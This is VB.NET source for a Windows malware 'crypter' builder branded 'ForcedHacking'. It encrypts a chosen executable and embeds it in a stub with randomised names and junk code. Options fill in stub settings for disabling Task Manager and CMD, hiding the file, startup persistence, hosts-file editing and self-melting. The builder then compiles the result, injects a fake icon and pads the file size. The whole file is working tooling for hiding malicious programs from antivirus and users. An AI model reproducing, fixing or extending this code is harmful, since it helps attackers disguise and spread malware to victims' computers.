Imports System.IO
Imports Microsoft.Win32
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Management

Public Class Form1
    Dim TheEOF As String
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As Long, ByVal Source As Long, ByVal Length As Integer)

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Dim Bobby As New OpenFileDialog
        Bobby.Filter = "Executables *.exe|*.exe"
        If Bobby.ShowDialog = Windows.Forms.DialogResult.OK Then TextBox1.Text = Bobby.FileName Else TextBox1.Text = ""
    End Sub
    '
    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim sado As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            sado.Append(b(z))
        Next
        Return sado.ToString
    End Function
    Public Function encrypt(ByVal message As Byte(), ByVal password As String) As Byte()
        Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
        Randomize()
        Dim rand As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim outarr(message.Length) As Byte
        Dim u As Integer
        For i As Integer = 0 To message.Length - 1
            outarr(i) += (message(i) Xor passarr(u)) Xor rand
            If u = password.Length - 1 Then u = 0 Else u = u + 1
        Next
        outarr(message.Length) = 112 Xor rand
        Return outarr
    End Function
    Public Function ReadEOFData(ByRef FilePath As String) As String
        Dim EOFBuf As String
        Dim lPos As Integer
        If Dir(FilePath) = "" Then
            Exit Function
        End If
        Dim ReadFile As String = IO.File.ReadAllText(FilePath)
        lPos = InStr(1, StrReverse(ReadFile), GetNullBytes(30))
        EOFBuf = (Mid(StrReverse(ReadFile), 1, lPos - 1))
        ReadEOFData = StrReverse(EOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
    End Function
    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim Buf As String
        Dim i As Short
        For i = 1 To lNum
            Buf = Buf & Chr(0)
        Next
        GetNullBytes = Buf
    End Function
 
 
    Public Class CD
        Public Shared Function format(ByVal input As Byte()) As String
            Dim out As New System.Text.StringBuilder
            Dim base64data As String = Convert.ToBase64String(input)
            Dim arr As String() = SplitString(base64data, 50000)
            For i As Integer = 0 To arr.Length - 1
                If i = arr.Length - 1 Then
                    out.Append(Chr(34) & arr(i) & Chr(34))
                Else
                    out.Append(Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
                End If
            Next
            Return out.ToString
        End Function
        Private Shared Function SplitString(ByVal input As String, ByVal partsize As Long) As String()
            Dim amount As Long = Math.Ceiling(input.Length / partsize)
            Dim out(amount - 1) As String
            Dim currentpos As Long = 0
            For I As Integer = 0 To amount - 1
                If I = amount - 1 Then
                    Dim temp((input.Length - currentpos) - 1) As Char
                    input.CopyTo(currentpos, temp, 0, (input.Length - currentpos))
                    out(I) = Convert.ToString(temp)
                Else
                    Dim temp(partsize - 1) As Char
                    input.CopyTo(currentpos, temp, 0, partsize)
                    out(I) = Convert.ToString(temp)
                    currentpos += partsize
                End If
            Next
            Return out
        End Function

    

    End Class
    Private Function CheckEoF(ByVal FilePath As String) As Boolean
        If EoF.ReadData(FilePath) = vbNullString Then
            Return False
        Else
            Return True
        End If
    End Function
    Private Sub BullionButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BullionButton2.Click
        Dim Bobby As New OpenFileDialog
        Bobby.Filter = "Executables *.exe|*.exe"
        If Bobby.ShowDialog = Windows.Forms.DialogResult.OK Then TextBox1.Text = Bobby.FileName Else TextBox1.Text = ""
        TheEOF = ReadEOFData(Bobby.FileName)
    End Sub

    Private Sub BullionButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BullionButton3.Click
        Try

            Dim sfd As New SaveFileDialog
            sfd.Filter = "Executables *.exe|*.exe"
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim Mub As String = My.Resources.Force
                Dim vars As String() = {"ErAqwXXCv15Ervito"}

                If chkMelt.Checked = True Then
                    Mub = Mub.Replace("%21%", "T")
                Else : End If
          
                If chkTaskManager.Checked = True Then
                    Mub = Mub.Replace("%22%", "T")
                Else : End If

                If chkCMD.Checked = True Then
                    Mub = Mub.Replace("%23%", "T")
                Else : End If

                If chkFolder.Checked = True Then
                    Mub = Mub.Replace("%24%", "T")
                Else : End If

                If chkRestart.Checked = True Then
                    Mub = Mub.Replace("%25%", "T")
                Else : End If

                If chkHide.Checked = True Then
                    Mub = Mub.Replace("%26%", "T")
                Else : End If

                If chkStart.Checked = True Then
                    Dim Startexestr As String = startexe.Text
                    Mub = Mub.Replace("%27%", "T")
                    Mub = Mub.Replace("%39%", Startexestr)
                ElseIf chkStart.Checked = False Then
                    Mub = Mub.Replace("%39%", "Kernel32")
                End If

                If chkHost.Checked = True Then
                    Dim Host1 As String = HostEdit.TextBox1.Text
                    Dim Host2 As String = HostEdit.TextBox2.Text
                    Dim Host3 As String = HostEdit.TextBox3.Text
                    Dim Host4 As String = HostEdit.TextBox4.Text
                    Dim host5 As String = HostEdit.TextBox5.Text
                    Dim host6 As String = HostEdit.TextBox6.Text
                    Dim host7 As String = HostEdit.TextBox7.Text
                    Dim host8 As String = HostEdit.TextBox8.Text
                    Dim host9 As String = HostEdit.TextBox9.Text
                    Dim host10 As String = HostEdit.TextBox10.Text
                    Mub = Mub.Replace("%28%", "T")
                    Mub = Mub.Replace("%29%", Host1)
                    Mub = Mub.Replace("%30%", Host2)
                    Mub = Mub.Replace("%31%", Host3)
                    Mub = Mub.Replace("%32%", Host4)
                    Mub = Mub.Replace("%33%", host5)
                    Mub = Mub.Replace("%34%", host6)
                    Mub = Mub.Replace("%35%", host7)
                    Mub = Mub.Replace("%36%", host8)
                    Mub = Mub.Replace("%37%", host9)
                    Mub = Mub.Replace("%38%", host10)
                Else : End If

                If chkJunk.Checked = True Then
                    Dim Junk1 As String
                    Dim Junk2 As String
                    Dim Junk3 As String


                    If chkJunk.Checked = True Then
                        Junk1 = GenerateJunk(RandomNumber(2, 1))
                        Junk2 = GenerateJunk(RandomNumber(3, 1))
                        Junk3 = GenerateJunk(RandomNumber(3, 1))
                        Mub = Mub.Replace("%101%", Junk1)
                        Mub = Mub.Replace("%102%", Junk2)
                        Mub = Mub.Replace("%103%", Junk3)

                    ElseIf chkJunk.Checked = False Then
                        Mub = Mub.Replace("%101%", "")
                        Mub = Mub.Replace("%102%", "")
                        Mub = Mub.Replace("%103%", "")
                    End If
                End If
                For i As Integer = 0 To vars.Length - 1 ' 
                    Mub = Mub.Replace(vars(i), random_key(15))
                Next
                Dim input As Byte() = encrypt(IO.File.ReadAllBytes(TextBox1.Text), "ForcedHacking")
                Mub = Mub.Replace("DeCFZvfPlUnTRd547", CD.format(input))
                Mub = Mub.Replace("%1337%", stealth.Text)
                iCompiler.GenerateExecutable(sfd.FileName, Mub, "")
                If iconpath.Text = vbNullString Then
                    MsgBox("Icon Is Required <3")
                Else
                    IconChanger.InjectIcon(sfd.FileName, iconpath.Text)
                    MsgBox("Crypted!", MsgBoxStyle.Information, "ForcedHacking")

                    If chkPumper.Checked = True Then

                        If chkKB.Checked = True Then
                            Dim z = File.OpenWrite(sfd.FileName)
                            Dim c = z.Seek(0, SeekOrigin.[End])
                            Dim b = Convert.ToInt32(txtKB.Text)
                            Dim v As Decimal = b * 1048
                            While c < v
                                c += 1
                                z.WriteByte(0)
                            End While
                            z.Close()
                        Else
                            If chkMB.Checked = True Then
                                Dim z = File.OpenWrite(sfd.FileName)
                                Dim c = z.Seek(0, SeekOrigin.[End])
                                Dim b = Convert.ToInt32(txtMB.Text)
                                Dim v As Decimal = b * 1048576
                                While c < v
                                    c += 1
                                    z.WriteByte(0)
                                End While
                                z.Close()
                            End If
                        End If
                    End If
                End If
            End If


        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub BullionButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BullionButton1.Click
        End
    End Sub

    Private Sub BullionButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BullionButton4.Click
        Dim ooo As New OpenFileDialog
        ooo.DefaultExt = "ico"
        ooo.Filter = "Icon Files (*.ico*)|*.ico*"
        ooo.FilterIndex = 1
        ooo.FileName = ""
        If ooo.ShowDialog(Me) = 1 Then
            iconpath.Text = ooo.FileName
        End If
        iconpath.Text = ooo.FileName
        Dim i As New Icon(ooo.FileName)
        Dim b As New Bitmap(i.ToBitmap)
        IconPicBox.Image = b
    End Sub

    Private Sub BullionTheme1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BullionTheme1.Click

    End Sub

    Private Sub BullionButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        TextBox1.Text = Environment.GetEnvironmentVariable("windir")
    End Sub

    Private Sub License_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub BullionButton5_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BullionButton5.Click
        HostEdit.Show()
    End Sub

    Private Sub chkJunk_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkJunk.CheckedChanged
        If chkJunk.Checked = True Then
            abc1.Checked = True
            abc2.Checked = True
            abc3.Checked = True
            abc4.Checked = True
            abc5.Checked = True
            abc6.Checked = True
            abc7.Checked = True
            abc8.Checked = True
        Else
            abc1.Checked = False
            abc2.Checked = False
            abc3.Checked = False
            abc4.Checked = False
            abc5.Checked = False
            abc6.Checked = False
            abc7.Checked = False
            abc8.Checked = False
        End If
    End Sub

    Private Sub chkStart_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkStart.CheckedChanged

    End Sub

    Private Sub BullionButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub

    Private Sub BullionButton7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)



    End Sub

    Private Sub JnkLow_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub

    Private Sub JnkMed_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub JnkHigh_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
End Class
